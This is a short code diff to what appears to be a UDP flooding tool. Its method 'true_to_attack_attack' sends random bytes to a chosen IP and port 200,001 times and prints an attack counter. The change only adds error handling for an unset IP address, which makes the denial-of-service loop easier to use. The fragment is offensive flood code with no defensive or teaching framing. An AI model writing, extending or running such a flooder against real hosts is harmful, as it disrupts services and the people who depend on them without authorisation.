@@ -84,7 +84,11 @@ class Main(Cmd):
 
 	def true_to_attack_attack(self):
 		for i in range(200001):
-			so.sendto(randbyte,(self.ip,self.port))
+			try:
+				so.sendto(randbyte,(self.ip,self.port))
+			except:
+				print('You did not set the IP address or did not set the IP address correctly')
+				break
 			print('This is the',i+1,'attack !') 
 
 	def true_to_attack_thread(self):
